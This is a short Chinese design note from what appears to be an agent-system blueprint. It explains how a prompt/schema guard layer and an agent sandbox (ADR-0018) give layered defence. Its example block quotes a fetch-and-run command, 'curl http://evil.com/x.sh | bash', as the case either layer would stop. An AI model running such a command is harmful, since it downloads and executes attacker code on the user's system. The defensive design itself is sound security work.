---
module_id: KE-module_blu-8_3___agent_sandbox_adr-0018-002
title: 8.3 与 Agent Sandbox（ADR-0018）的双层关系
category: module_blueprint
---

# 8.3 与 Agent Sandbox（ADR-0018）的双层关系

8.3 与 Agent Sandbox（ADR-0018）的双层关系

```
L1-L4（LSG，Prompt/Schema 层）
  + Sandbox（ADR-0018，文件/命令/网络层）
  = 双层纵深防御

  如果 LSG L4 漏过一条 "curl http://evil.com/x.sh | bash"：
    Sandbox network_access='none' 阻止出站 → 最终无害
  如果 Sandbox 被 ACL bug 绕过：
    LSG L4 已拒绝该命令 → 最终无害
```

---
